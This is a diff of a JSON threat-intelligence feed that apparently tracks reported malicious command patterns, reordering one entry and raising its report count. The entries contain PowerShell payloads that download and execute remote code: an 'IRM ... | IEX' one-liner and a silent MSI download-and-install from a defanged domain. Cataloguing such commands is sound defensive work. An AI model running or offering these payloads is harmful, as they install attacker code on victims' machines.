@@ -748,6 +748,44 @@
     ]
   },
   {
+    "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 26,
+    "FirstSeen": "2026-11-09T05:36:29.603000+00:00",
+    "LastSeen": "2026-11-14T13:15:29.637000+00:00",
+    "ReportIds": [
+      "cmw8twaul23bu0omlsfsgkias",
+      "cmw8uf2tw245m0omlubwlc0vv",
+      "cmw8ugfu224ab0omlylbb1laz",
+      "cmw8v9k0f25p90omldjeh182z",
+      "cmw8wi5pc27si0omln3w2d5bq",
+      "cmw8ywl1j2clu0oml07xszzjx",
+      "cmw8zvhj62ek90omlz9iz7aq5",
+      "cmw90jwce2g580omlqquib5kq",
+      "cmw9saotl05gj0omlanf5buol",
+      "cmw9sktyg065b0omluyuqwbus",
+      "cmw9xznov07gc0omlfempg6ha",
+      "cmw9zizln07hd0oml2za1wlqb",
+      "cmwa78v3607w70omluib5p702",
+      "cmwat1pv303q80omli9ph0e1z",
+      "cmwat3unn03te0omlzgthlvd5",
+      "cmwaug9je04ja0oml6zapyr46",
+      "cmwax1z2k00l70omluwxueoah",
+      "cmwbgl81k070e0nmliamdcqj4",
+      "cmwbi0g9507kw0nmljk124v3m",
+      "cmwbiqeaw08fp0nmlqsxqo5vn",
+      "cmwd85ele02an0omlhg2v44z8",
+      "cmwdamo6k02u90omlobyiekvn",
+      "cmwey108y0f240omlxgdcseaf",
+      "cmwfasa7u0fyp0omllxgx5jhg",
+      "cmwg9lbgo0l4u0omlslp8xa75",
+      "cmwgfhtxn0l8j0omldvxcqc8p"
+    ],
+    "PayloadExamples": [
+      "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX"
+    ]
+  },
+  {
     "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
     "DistinctPayloadCount": 1,
     "ReportCount": 25,
@@ -782,43 +820,6 @@
     ],
     "PayloadExamples": [
       "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
-    ]
-  },
-  {
-    "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 25,
-    "FirstSeen": "2026-11-09T05:36:29.603000+00:00",
-    "LastSeen": "2026-11-14T10:30:14.635000+00:00",
-    "ReportIds": [
-      "cmw8twaul23bu0omlsfsgkias",
-      "cmw8uf2tw245m0omlubwlc0vv",
-      "cmw8ugfu224ab0omlylbb1laz",
-      "cmw8v9k0f25p90omldjeh182z",
-      "cmw8wi5pc27si0omln3w2d5bq",
-      "cmw8ywl1j2clu0oml07xszzjx",
-      "cmw8zvhj62ek90omlz9iz7aq5",
-      "cmw90jwce2g580omlqquib5kq",
-      "cmw9saotl05gj0omlanf5buol",
-      "cmw9sktyg065b0omluyuqwbus",
-      "cmw9xznov07gc0omlfempg6ha",
-      "cmw9zizln07hd0oml2za1wlqb",
-      "cmwa78v3607w70omluib5p702",
-      "cmwat1pv303q80omli9ph0e1z",
-      "cmwat3unn03te0omlzgthlvd5",
-      "cmwaug9je04ja0oml6zapyr46",
-      "cmwax1z2k00l70omluwxueoah",
-      "cmwbgl81k070e0nmliamdcqj4",
-      "cmwbi0g9507kw0nmljk124v3m",
-      "cmwbiqeaw08fp0nmlqsxqo5vn",
-      "cmwd85ele02an0omlhg2v44z8",
-      "cmwdamo6k02u90omlobyiekvn",
-      "cmwey108y0f240omlxgdcseaf",
-      "cmwfasa7u0fyp0omllxgx5jhg",
-      "cmwg9lbgo0l4u0omlslp8xa75"
-    ],
-    "PayloadExamples": [
-      "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX"
     ]
   },
   {
